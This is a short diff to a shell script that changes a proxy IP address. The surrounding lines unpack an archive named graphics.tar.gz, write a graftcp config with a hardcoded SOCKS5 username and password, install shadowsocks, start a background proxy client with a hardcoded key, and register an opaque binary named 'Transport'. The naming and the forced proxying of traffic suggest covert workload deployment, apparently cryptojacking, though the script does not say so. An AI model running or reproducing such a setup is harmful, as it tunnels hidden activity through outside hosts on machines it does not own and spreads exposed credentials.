@@ -17,7 +17,7 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 44.202.124.0:1080
+socks5 = 3.86.200.1:1080
 socks5_username = mikrotik999
 socks5_password = Elibawnos
 END
@@ -36,7 +36,7 @@ chmod +x Transport
 
 apt -y install shadowsocks-libev rng-tools
 
-ss-local -s 44.202.124.0 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305 -v &
+ss-local -s 3.86.200.1 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305 -v &
 
 ph add Transport
 
